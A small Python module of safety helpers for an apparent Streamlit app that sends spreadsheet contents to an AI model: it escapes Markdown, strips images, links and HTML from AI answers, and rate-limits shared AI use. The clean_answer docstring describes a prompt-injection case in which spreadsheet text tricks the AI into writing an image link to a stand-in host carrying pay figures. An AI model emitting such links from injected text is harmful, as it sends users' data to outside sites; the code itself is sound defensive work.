"""Small safety helpers. Plain Python (no Streamlit), so tests.py can check them directly."""

import re
import threading
import time

# Characters that mean something in Markdown (and "$", which Streamlit uses for maths).
_MARKDOWN = re.compile(r"([\\`*_{}\[\]()#+!|<>~$])")


def md_safe(text):
    """Text from a file, shown as plain text. A department called '![x](http://...)' would otherwise be
    drawn as a picture fetched from someone else's website."""
    return _MARKDOWN.sub(r"\\\1", str(text))


def clean_answer(text):
    """An AI answer keeps its bold and lists, but loses pictures and links.

    A spreadsheet can contain text written to trick the AI. If the AI were tricked into writing a
    picture such as ![](https://someone.example/?pay=48000), the browser would fetch it and send those
    figures away. Links are kept as their words only, so nothing in an answer reaches another website.
    """
    text = re.sub(r"!\[[^\]]*\]\([^)]*\)", "", str(text))            # pictures go
    text = re.sub(r"\[([^\]]*)\]\([^)]*\)", r"\1", text)            # links keep their words
    text = re.sub(r"<[^>]+>", "", text)                              # no HTML tags
    return re.sub(r"https?://\S+", "[link removed]", text)


class Allowance:
    """Counts AI uses for the whole app, so nobody can use up the shared free Groq allowance.

    It holds numbers only, never anyone's data, so it is safe to share between visitors.
    """

    def __init__(self, per_hour):
        self.per_hour, self.hour, self.used = per_hour, None, 0
        self.lock = threading.Lock()     # two visitors at the same moment cannot both take the last use

    def take(self, now=None):
        """Uses one, and returns True if there was one left this hour."""
        hour = time.strftime("%Y%m%d%H", time.localtime(now))
        with self.lock:
            if hour != self.hour:
                self.hour, self.used = hour, 0
            if self.used >= self.per_hour:
                return False
            self.used += 1
            return True
